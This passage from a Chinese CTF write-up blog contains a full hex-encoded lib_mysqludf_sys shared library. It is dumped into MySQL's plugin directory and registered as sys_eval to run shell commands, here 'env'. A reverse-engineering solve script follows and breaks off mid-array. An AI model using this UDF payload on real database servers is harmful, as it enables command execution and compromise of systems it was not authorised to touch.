4c01000004faffff6c0100000ffaffff8c01000072faffffac010000cefbffffcc010000fafbffffec010000d4fcffff0c0200006ffdffff2c0200007afdffff4c020000a9fdffff6c02000044feffff8c0200004ffeffffac0200001400000000000000017a5200017810011b0c070890010000240000001c000000f8f5ffffe0000000000e10460e184a0f0b770880003f1a3b2a332422000000001400000044000000b0f6ffff0800000000000000000000001c0000005c00000082f7ffff8700000000410e108602430d0602820c070800001c0000007c000000e9f7ffff0b00000000410e108602430d06460c07080000001c0000009c000000d4f7ffff6b00000000410e108602430d0602660c070800001c000000bc0000001ff8ffff9100000000410e108602430d06028c0c070800001c000000dc00000090f8ffff0b00000000410e108602430d06460c07080000001c000000fc0000007bf8ffff6300000000410e108602430d06025e0c070800001c0000001c010000bef8ffff5c01000000410e108602430d060357010c0708001c0000003c010000faf9ffff2c00000000410e108602430d06670c07080000001c0000005c01000006faffffda00000000410e108602430d0602d50c070800001c0000007c010000c0faffff9b00000000410e108602430d0602960c070800001c0000009c0100003bfbffff0b00000000410e108602430d06460c07080000001c000000bc01000026fbffff2f00000000410e108602430d066a0c07080000001c000000dc01000035fbffff9b00000000410e108602430d0602960c070800001c000000fc010000b0fbffff0b00000000410e108602430d06460c07080000001c0000001c0200009bfbffffa301000000410e108602430d06039e010c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000700c000000000000300c0000000000000100000000000000a2010000000000000c00000000000000900a0000000000000d00000000000000f8130000000000001900000000000000101e2000000000001b0000000000000008000000000000001a00000000000000181e2000000000001c000000000000000800000000000000f5feff6f00000000f001000000000000050000000000000038060000000000000600000000000000a8020000000000000a00000000000000e5010000000000000b000000000000001800000000000000030000000000000000202000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000058090000000000000700000000000000b0080000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f000000007008000000000000ffffff6f000000000100000000000000f0ffff6f000000001e08000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000201e20000000000000000000000000000000000000000000c60a000000000000d60a000000000000e60a000000000000f60a000000000000060b000000000000160b000000000000260b000000000000360b000000000000460b000000000000560b000000000000660b000000000000760b000000000000860b00000000000080202000000000004743433a20285562756e747520372e342e302d317562756e7475317e31382e30342e312920372e342e300000000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300a802000000000000000000000000000000000000030004003806000000000000000000000000000000000000030005001e0800000000000000000000000000000000000003000600700800000000000000000000000000000000000003000700b00800000000000000000000000000000000000003000800580900000000000000000000000000000000000003000900900a00000000000000000000000000000000000003000a00b00a00000000000000000000000000000000000003000b00900b00000000000000000000000000000000000003000c00a00b00000000000000000000000000000000000003000d00f81300000000000000000000000000000000000003000e00011400000000000000000000000000000000000003000f00041400000000000000000000000000000000000003001000981400000000000000000000000000000000000003001100101e20000000000000000000000000000000000003001200181e20000000000000000000000000000000000003001300201e20000000000000000000000000000000000003001400e01f2000000000000000000000000000000000000300150000202000000000000000000000000000000000000300160080202000000000000000000000000000000000000300170088202000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00a00b00000000000000000000000000000e00000002000c00e00b00000000000000000000000000002100000002000c00300c00000000000000000000000000003700000001001700882020000000000001000000000000004600000001001200181e20000000000000000000000000006d00000002000c00700c00000000000000000000000000007900000001001100101e2000000000000000000000000000980000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000ab00000001001000d0160000000000000000000000000000000000000400f1ff00000000000000000000000000000000b90000000100160080202000000000000000000000000000c600000001001300201e2000000000000000000000000000cf00000000000f0004140000000000000000000000000000e20000000100160088202000000000000000000000000000ee00000001001500002020000000000000000000000000000401000012000000000000000000000000000000000000001801000012000000000000000000000000000000000000002a01000012000000000000000000000000000000000000003f01000020000000000000000000000000000000000000005b01000012000c00080e0000000000000b000000000000006a01000012000c007e110000000000002f000000000000007301000012000c00d8100000000000009b000000000000008101000012000000000000000000000000000000000000009501000010001600882020000000000000000000000000009c01000012000d00f8130000000000000000000000000000a20100001200000000000000000000000000000000000000b60100001200000000000000000000000000000000000000d20100001200000000000000000000000000000000000000e60100001200000000000000000000000000000000000000fa01000012000000000000000000000000000000000000000d02000012000c005312000000000000a3010000000000001602000012000c00130e00000000000063000000000000001e02000020000000000000000000000000000000000000002d02000012000c00fe0f000000000000da000000000000003502000012000000000000000000000000000000000000004802000012000c000c0d0000000000006b000000000000005e02000012000000000000000000000000000000000000007202000012000c00010d0000000000000b000000000000008f02000012000c00760e0000000000005c010000000000009c0200001000170090202000000000000000000000000000a102000012000c0048120000000000000b00000000000000b10200001200000000000000000000000000000000000000c60200001000170088202000000000000000000000000000d20200001200000000000000000000000000000000000000e502000012000c00d20f0000000000002c00000000000000f402000012000c0073110000000000000b000000000000000403000012000c00ad110000000000009b000000000000001203000012000c00770d00000000000091000000000000001f03000020000000000000000000000000000000000000003903000022000000000000000000000000000000000000007b01000012000900900a00000000000000000000000000005503000012000c007a0c00000000000087000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37363937005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f6d7973716c7564665f7379732e63005f5f4652414d455f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e3500667265654040474c4942435f322e322e35007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65007379735f6765745f6465696e6974007379735f65786563007379735f657865635f696e697400736574656e764040474c4942435f322e322e35005f6564617461005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e340073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e35007379735f6576616c007379735f676574005f5f676d6f6e5f73746172745f5f007379735f736574006d656d6370794040474c4942435f322e3134006c69625f6d7973716c7564665f7379735f696e666f006d616c6c6f634040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f7365745f696e6974005f656e64007379735f6576616c5f6465696e6974007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400706f70656e4040474c4942435f322e322e35007379735f7365745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f696e6974007379735f6765745f696e6974005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f696e697400002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f001000000000000b400000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000a802000000000000a80200000000000090030000000000000400000001000000080000000000000018000000000000004000000003000000020000000000000038060000000000003806000000000000e50100000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000001e080000000000001e080000000000004c0000000000000003000000000000000200000000000000020000000000000055000000feffff6f020000000000000070080000000000007008000000000000400000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000b008000000000000b008000000000000a8000000000000000300000000000000080000000000000018000000000000006e00000004000000420000000000000058090000000000005809000000000000380100000000000003000000150000000800000000000000180000000000000078000000010000000600000000000000900a000000000000900a000000000000170000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000b00a000000000000b00a000000000000e0000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000900b000000000000900b000000000000080000000000000000000000000000000800000000000000080000000000000087000000010000000600000000000000a00b000000000000a00b00000000000056080000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000f813000000000000f8130000000000000900000000000000000000000000000004000000000000000000000000000000930000000100000002000000000000000114000000000000011400000000000002000000000000000000000000000000010000000000000000000000000000009b000000010000000200000000000000041400000000000004140000000000009400000000000000000000000000000004000000000000000000000000000000a9000000010000000200000000000000981400000000000098140000000000003c02000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000800000000000000bf0000000f0000000300000000000000181e200000000000181e0000000000000800000000000000000000000000000008000000000000000800000000000000cb000000060000000300000000000000201e200000000000201e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e01f200000000000e01f0000000000002000000000000000000000000000000008000000000000000800000000000000d4000000010000000300000000000000002020000000000000200000000000008000000000000000000000000000000008000000000000000800000000000000dd000000010000000300000000000000802020000000000080200000000000000800000000000000000000000000000008000000000000000000000000000000e3000000080000000300000000000000882020000000000088200000000000000800000000000000000000000000000001000000000000000000000000000000e8000000010000003000000000000000000000000000000088200000000000002b00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000b82000000000000068070000000000001a0000002a0000000800000000000000180000000000000009000000030000000000000000000000000000000000000020280000000000007003000000000000000000000000000001000000000000000000000000000000110000000300000000000000000000000000000000000000902b000000000000f100000000000000000000000000000001000000000000000000000000000000&#x27;) into dumpfile &#x27;/usr/lib/mysql/p1ugin/mysqludf111.so&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">create function sys_eval returns string soname &quot;mysqludf111.so&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">select sys_eval(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706599727475-61133a3e-8467-4253-96f2-fc859fc53986.png\" alt=\"\"></p>\n<h3 id=\"reverse\"><a class=\"markdownIt-Anchor\" href=\"#reverse\">#</a> Reverse</h3>\n<h4 id=\"mz\"><a class=\"markdownIt-Anchor\" href=\"#mz\">#</a> MZ</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706626189405-35f77f62-dfad-4f0f-b2d8-c3e8747f55ec.png\" alt=\"\"></p>\n<p>所以每一个输入的字母都必须满足两个判断中的一个，否则就会输出 Wrong flag</p>\n<p>直接爆破发现有多解，不能直接爆破，需要使用 DFS 深度优先算法去遍历所有的解法。由题目提示知道 flag 是有意义的字符串，发现比较像 flag 的字符串，输入发现正确。就不用通过 v9 去进行 sha1 判断了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from asyncio import sleep</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">data = [0x00000005, 0x00F0F7D8, 0x00000002, 0x00F0E2E0, 0x00000014, 0x00F11E10, 0x00000015, 0x00F0E9D8, 0x0000002B, 0x00F10CB0, 0x00000076, 0x00F0CD70, 0x0000005F, 0x00F0CE58, 0x0000000C, 0x00F0EAC8, 0x0000005D, 0x00F0A438, 0x00000067, 0x00F0A950, 0x0000000D, 0x00F10CF0, 0x00000045, 0x00F0D288, 0x0000006C, 0x00F10030, 0x0000004A, 0x00F0E7C0, 0x00000045, 0x00F090E0, 0x00000020, 0x00F0C858, 0x00000050, 0x00F0BB88, 0x00000071, 0x00F0C410, 0x00000045, 0x00F0E4C0, 0x00000044, 0x00F0F0E0, 0x0000006A, 0x00F10A08, 0x00000050, 0x00F0D778, 0x0000001F, 0x00F0CF18, 0x00000036, 0x00F0CD68, 0x00000009, 0x00F0BEA8, 0x00000056, 0x00F0E380, 0x00000028, 0x00F0CA70, 0x0000000A, 0x00F0AA10, 0x00000035, 0x00F0DAA8, 0x0000007D, 0x00F11930, 0x0000007D, 0x00F0BA98, 0x0000002B, 0x00F0B3D8, 0x00000001, 0x00F0C648, 0x00000059, 0x00F09D90, 0x00000031, 0x00F0CB20, 0x00000058, 0x00F09F70, 0x00000002, 0x00F10780, 0x00000062, 0x00F0B2E0, 0x00000015, 0x00F0F318, 0x00000032, 0x00F0F798, 0x00000067, 0x00F10648, 0x00000058, 0x00F093A8, 0x0000001A, 0x00F0FEC8, 0x00000062, 0x00F10D30, 0x0000003E, 0x00F0FF68, 0x0000003C, 0x00F11068, 0x00000063, 0x00F0AC38, 0x00000078, 0x00F0A988, 0x00000037, 0x00F0C898, 0x00000076, 0x00F0ACE8, 0x00000069, 0x00F0C5C0, 0x0000005B, 0x00F0C238, 0x00000038, 0x00F09818, 0x00000017, 0x00F0A530, 0x0000004A, 0x00F12068, 0x0000004D, 0x00F0AD50, 0x0000005A, 0x00F10E98, 0x00000039, 0x00F0C180, 0x00000027, 0x00F0F278, 0x0000002B, 0x00F0C7F0, 0x0000003C, 0x00F10FA8, 0x0000007B, 0x00F0BF20, 0x00000034, 0x00F0BDC8, 0x00000030, 0x00F0F020, 0x00000048, 0x00F12BB8, 0x00000029, 0x00F098D8, 0x00000065, 0x00F0BA50, 0x0000007A, 0x00F10D80, 0x00000037, 0x00F10B08, 0x0000007A, 0x00F0A2E0, 0x00000032, 0x00F0A2C0, 0x00000005, 0x00F0AC98, 0x00000027, 0x00F0A918, 0x00000070, 0x00F0DA90, 0x00000079, 0x00F09D00, 0x00000064, 0x00F0BC88, 0x00000052, 0x00F0A4E8, 0x0000005D, 0x00F0FEA0, 0x00000018, 0x00F0BDB8, 0x0000001F, 0x00F10C60, 0x0000006C, 0x00F118A8, 0x0000007D, 0x00F0CE18, 0x00000005, 0x00F0B220, 0x00000058, 0x00F093A8, 0x00000015, 0x00F0CFA0, 0x0000003F, 0x00F09538, 0x00000023, 0x00F103D8, 0x00000075, 0x00F0CFE8, 0x0000007A, 0x00F0B688, 0x0000001F, 0x00F09798, 0x00000024, 0x00F0EAA0, 0x0000003F, 0x00F0E9C0, 0x00000008, 0x00F0ADA8, 0x0000002B, 0x00F11EA0, 0x00000017, 0x00F0D310, 0x00000038, 0x00F0A310, 0x00000045, 0x00F0C7A8, 0x00000025, 0x00F09730, 0x0000000C, 0x00F0FE28, 0x00000014, 0x00F0E180, 0x0000004D, 0x00F0AD98, 0x00000042, 0x00F0B0B8, 0x0000005E, 0x00F0B180, 0x0000006E, 0x00F111C8, 0x0000006B, 0x00F0C6A8, 0x00000007, 0x00F098C8, 0x00000024, 0x00F0BFD8, 0x0000000D, 0x00F0D218, 0x0000004C, 0x00F0E8E8, 0x00000054, 0x00F0A968, 0x0000002A, 0x00F0E110, 0x0000001C, 0x00F0B170, 0x0000005D, 0x00F09E38, 0x0000007B, 0x00F0F758, 0x0000002C, 0x00F12028, 0x00000034, 0x00F0FE38, 0x00000046, 0x00F0B7F0, 0x00000007, 0x00F10DD8, 0x00000010, 0x00F10470, 0x0000005E, 0x00F10130, 0x00000079, 0x00F0A740, 0x0000001B, 0x00F0C638, 0x00000058, 0x00F11DB0, 0x00000047, 0x00F0C508, 0x0000007A, 0x00F12168, 0x00000070, 0x00F0ACF0, 0x0000002D, 0x00F0DDC0, 0x0000000F, 0x00F0C5B8, 0x00000029, 0x00F0B458, 0x00000003, 0x00F0DCD8, 0x0000007A, 0x00F0E198, 0x00000041, 0x00F0A770, 0x00000047, 0x00F092A8, 0x0000003D, 0x00F0F958, 0x00000046, 0x00F0D5A8, 0x0000005F, 0x00F11E70, 0x00000009, 0x00F09900, 0x0000006E, 0x00F0C798, 0x00000011, 0x00F0A6D8, 0x00000014, 0x00F0DB98, 0x0000004F, 0x00F11A28, 0x00000043, 0x00F10440, 0x00000063, 0x00F0B050, 0x0000007E, 0x00F12A70, 0x00000000, 0x00F0A250, 0x00000062, 0x00F09828, 0x00000077, 0x00F12248, 0x00000031, 0x00F0BCE0, 0x00000009, 0x00F0BC00, 0x00000036, 0x00F0CBC8, 0x00000078, 0x00F0E5A8, 0x00000033, 0x00F0F2B0, 0x00000067, 0x00F0D4F0, 0x00000043, 0x00F0D5B0, 0x0000007C, 0x00F0C7A0, 0x0000003D, 0x00F0F840, 0x00000071, 0x00F0D428, 0x00000033, 0x00F117D0, 0x0000007D, 0x00F11090, 0x00000000, 0x00F0DC98, 0x00000024, 0x00F12050, 0x00000073, 0x00F0D5D0, 0x0000000A, 0x00F12430, 0x00000022, 0x00F11690, 0x00000023, 0x00F0A700, 0x0000006F, 0x00F09D50, 0x0000000E, 0x00F0DFF0, 0x00000043, 0x00F0E7C0, 0x0000004C, 0x00F0BDD8, 0x0000007C, 0x00F11DF8, 0x0000003A, 0x00F12A38, 0x00000036, 0x00F0D7C8, 0x00000075, 0x00F0C368, 0x00000051, 0x00F102B0, 0x0000000F, 0x00F0D2B0, 0x00000051, 0x00F0AC60, 0x00000041, 0x00F0B3A8, 0x0000002A, 0x00F0FE88, 0x00000002, 0x00F09290, 0x0000005C, 0x00F0B9C0, 0x0000001D, 0x00F12C58, 0x0000000E, 0x00F11748, 0x00000049, 0x00F0FD80, 0x00000020, 0x00F0C6E0, 0x00000055, 0x00F0F7E8, 0x0000002C, 0x00F12670, 0x0000004A, 0x00F0DEB0, 0x0000001D, 0x00F0F328, 0x00000051, 0x00F0ECF0, 0x00000055, 0x00F11A48, 0x00000013, 0x00F0B280, 0x00000058, 0x00F0A820, 0x00000068, 0x00F0C588, 0x0000002E, 0x00F0C658, 0x00000013, 0x00F10030, 0x00000050, 0x00F0F6E8, 0x00000061, 0x00F0AC10, 0x00000060, 0x00F102E0, 0x00000060, 0x00F09758, 0x00000005, 0x00F0F408, 0x00000009, 0x00F10B70, 0x00000005, 0x00F116E8, 0x00000017, 0x00F096B8, 0x00000034, 0x00F0F0A8, 0x00000063, 0x00F0B1B0, 0x00000020, 0x00F0C6E8, 0x00000070, 0x00F0E230, 0x00000024, 0x00F10EC8, 0x00000012, 0x00F12880, 0x00000046, 0x00F0FDC0, 0x00000060, 0x00F0AEC0, 0x00000014, 0x00F0BCD0, 0x00000044, 0x00F0F5B0, 0x00000074, 0x00F096F0, 0x00000068, 0x00F0FEB8, 0x00000052, 0x00F0CB80, 0x00000052, 0x00F0BEA8, 0x00000069, 0x00F0FB10, 0x00000076, 0x00F0AFA0, 0x00000065, 0x00F0A748, 0x00000075, 0x00F0C7B0, 0x0000003C, 0x00F12990, 0x00000074, 0x00F0B410, 0x00000065, 0x00F0F620, 0x00000024, 0x00F0A3C8, 0x00000066, 0x00F0B6B8, 0x00000070, 0x00F0EF48, 0x00000069, 0x00F0FFB0, 0x00000004, 0x00F11A28, 0x00000012, 0x00F0F3F8, 0x00000064, 0x00F0BF60, 0x00000011, 0x00F10208, 0x0000000B, 0x00F0E708, 0x0000005C, 0x00F0F4E8, 0x00000020, 0x00F0B760, 0x00000046, 0x00F0DF40, 0x00000038, 0x00F0FB38, 0x00000056, 0x00F0C2B8, 0x00000052, 0x00F0FA98, 0x00000000, 0x00F122E0, 0x00000063, 0x00F0F358, 0x00000029, 0x00F11288, 0x00000030, 0x00F0B488, 0x00000034, 0x00F0A890, 0x00000040, 0x00F09D88, 0x00000054, 0x00F12C00, 0x0000003D, 0x00F0A318, 0x00000074, 0x00F0DD58, 0x00000070, 0x00F0C360, 0x00000010, 0x00F0B3F8, 0x0000003C, 0x00F09478, 0x00000011, 0x00F11350, 0x00000044, 0x00F098B8, 0x0000004B, 0x00F0F368, 0x0000002A, 0x00F0D708, 0x00000073, 0x00F09450, 0x00000008, 0x00F10400, 0x00000051, 0x00F0A568, 0x00000077, 0x00F0D8C8, 0x00000009, 0x00F0DAE8, 0x00000009, 0x00F0D0C0, 0x0000000C, 0x00F09E68, 0x00000044, 0x00F0C890, 0x00000055, 0x00F0FBB0, 0x00000028, 0x00F108E8, 0x00000059, 0x00F125C0, 0x00000051, 0x00F0CBA8, 0x0000002B, 0x00F11340, 0x00000017, 0x00F0FF80, 0x00000018, 0x00F0C1E0, 0x00000000, 0x00F0A520, 0x00000071, 0x00F0A5A8, 0x00000027, 0x00F11778, 0x00000049, 0x00F12720, 0x00000007, 0x00F0A938, 0x0000001A, 0x00F0D080, 0x0000004F, 0x00F0F620, 0x00000049, 0x00F0FA38, 0x00000032, 0x00F12C58, 0x00000036, 0x00F0F398, 0x00000040, 0x00F0B4A0, 0x00000033, 0x00F0BB78, 0x00000051, 0x00F0BBF0, 0x0000001E, 0x00F099D0, 0x0000001A, 0x00F0AEC8, 0x00000069, 0x00F09698, 0x0000003F, 0x00F0D360, 0x0000004E, 0x00F0ECB0, 0x00000044, 0x00F11140, 0x00000025, 0x00F09AA8, 0x00000004, 0x00F114E8, 0x0000004C, 0x00F0B458, 0x00000071, 0x00F09E98, 0x0000004D, 0x00F0A0E8, 0x00000027, 0x00F0DA20, 0x0000003E, 0x00F0F650, 0x0000002F, 0x00F09088, 0x0000004C, 0x00F0B360, 0x0000001D, 0x00F0B910, 0x0000001E, 0x00F0A978, 0x00000070, 0x00F0D4C8, 0x0000000B, 0x00F0F050, 0x00000064, 0x00F099C8, 0x00000006, 0x00F0C8A0, 0x0000004B, 0x00F112D8, 0x0000001D, 0x00F09088, 0x0000007B, 0x00F0F248, 0x00000022, 0x00F0D168, 0x00000034, 0x00F0B038, 0x0000007A, 0x00F12B00, 0x00000067, 0x00F0C538, 0x00000042, 0x00F09490, 0x00000051, 0x00F0A120, 0x0000006A, 0x00F0E688, 0x00000072, 0x00F12988, 0x00000009, 0x00F0E680, 0x00000068, 0x00F099D0, 0x00000076, 0x00F0F950, 0x00000037, 0x00F117D8, 0x00000043, 0x00F112C0, 0x0000000C, 0x00F11480, 0x00000013, 0x00F0CA00, 0x00000063, 0x00F0FF68, 0x0000004F, 0x00F0C178, 0x00000042, 0x00F12738, 0x0000005F, 0x00F12938, 0x00000038, 0x00F0AA50, 0x00000037, 0x00F0DBE0, 0x0000006E, 0x00F128E8, 0x0000000C, 0x00F0ED98, 0x00000000, 0x00F0F798, 0x0000005E, 0x00F0BEA8, 0x0000006B, 0x00F0ABD8, 0x0000004F, 0x00F119D8, 0x00000055, 0x00F0B850, 0x0000004C, 0x00F113D0, 0x00000040, 0x00F0B038, 0x00000013, 0x00F10DC8, 0x0000002A, 0x00F10980, 0x00000029, 0x00F10F80, 0x0000002D, 0x00F0E3D8, 0x00000030, 0x00F0B018, 0x0000001B, 0x00F105F8, 0x00000044, 0x00F0AA38, 0x00000034, 0x00F108A0, 0x0000004A, 0x00F10328, 0x00000056, 0x00F09E80, 0x0000004A, 0x00F0F828, 0x0000005F, 0x00F0F5A0, 0x0000005D, 0x00F0BC20, 0x00000020, 0x00F105F0, 0x0000001C, 0x00F09BC8, 0x0000000E, 0x00F12B80, 0x00000050, 0x00F0C0E0, 0x00000005, 0x00F0AAC8, 0x0000002F, 0x00F091C8, 0x00000074, 0x00F11ED8, 0x00000045, 0x00F10160, 0x0000001B, 0x00F0B6E8, 0x0000002E, 0x00F0C1A0, 0x0000003A, 0x00F0A848, 0x0000006D, 0x00F0EF28, 0x00000070, 0x00F0E140, 0x00000025, 0x00F0A480, 0x00000023, 0x00F0ABA8, 0x0000000D, 0x00F0CE30, 0x00000010, 0x00F11C80, 0x0000004E, 0x00F0D330, 0x00000078, 0x00F0B6E0, 0x00000025, 0x00F10118, 0x0000002A, 0x00F10E90, 0x00000009, 0x00F0C048, 0x0000007A, 0x00F0DDF8, 0x00000029, 0x00F09CC8, 0x00000060, 0x00F0A4E0, 0x00000069, 0x00F11158, 0x0000007B, 0x00F0D220, 0x00000063, 0x00F12C18, 0x00000034, 0x00F0E260, 0x00000063, 0x00F0DAB8, 0x00000010, 0x00F0B6B0, 0x0000007C, 0x00F10B00, 0x0000007E, 0x00F0C6B0, 0x00000029, 0x00F11D00, 0x00000079, 0x00F0AC88, 0x00000014, 0x00F0A218, 0x0000002D, 0x00F0F110, 0x00000008, 0x00F107C8, 0x0000000E, 0x00F0E338, 0x00000005, 0x00F0AD90, 0x0000007D, 0x00F10CA0, 0x0000000E, 0x00F0D758, 0x0000005E, 0x00F11030, 0x00000045, 0x00F0CF40, 0x00000069, 0x00F09790, 0x0000002F, 0x00F095D0, 0x00000065, 0x00F0BF38, 0x0000006A, 0x00F11198, 0x00000034, 0x00F0C408, 0x0000001A, 0x00F10D00, 0x0000006A, 0x00F09BA8, 0x00000047, 0x00F101B8, 0x00000011, 0x00F0B048, 0x00000022, 0x00F09E80, 0x00000060, 0x00F0D498, 0x0000002C, 0x00F12C08, 0x00000067, 0x00F10520, 0x0000005E, 0x00F124E0, 0x00000033, 0x00F0C328, 0x0000004E, 0x00F0E9A0, 0x00000045, 0x00F0FC20, 0x00000050, 0x00F0D640, 0x0000004A, 0x00F0D000, 0x0000003D, 0x00F122B8, 0x0000005E, 0x00F09D90, 0x00000034, 0x00F09CA8, 0x00000001, 0x00F09750, 0x00000010, 0x00F0DD28, 0x0000003B, 0x00F102B8, 0x00000077, 0x00F105F8, 0x0000000F, 0x00F0EC98, 0x0000001E, 0x00F11258, 0x00000005, 0x00F09A38, 0x00000045, 0x00F0DBB8, 0x00000030, 0x00F0D318, 0x00000065, 0x00F0D070, 0x00000061, 0x00F0AD00, 0x0000003C, 0x00F09150, 0x00000052, 0x00F0A648, 0x00000007, 0x00F0D798, 0x0000000E, 0x00F09BF8, 0x00000038, 0x00F11E00, 0x00000074, 0x00F10268, 0x00000069, 0x00F099A8, 0x0000007B, 0x00F0BB60, 0x0000004E, 0x00F0D270, 0x0000001C, 0x00F0B100, 0x0000007D, 0x00F098D8, 0x00000019, 0x00F0CC50, 0x00000051, 0x00F0C1A0, 0x00000070, 0x00F0FB30, 0x0000001B, 0x00F0E1F8, 0x00000042, 0x00F0A980, 0x0000000B, 0x00F0B0F8, 0x00000071, 0x00F0C8D8, 0x00000001, 0x00F0B100, 0x00000044, 0x00F0B390, 0x0000000C, 0x00F0F5C8, 0x00000052, 0x00F0EF18, 0x00000079, 0x00F10940, 0x00000036, 0x00F0A078, 0x00000018, 0x00F0D2A0, 0x00000075, 0x00F10D40, 0x0000001A, 0x00F124F8, 0x00000059, 0x00F0EAB0, 0x0000003E, 0x00F0C990, 0x0000007C, 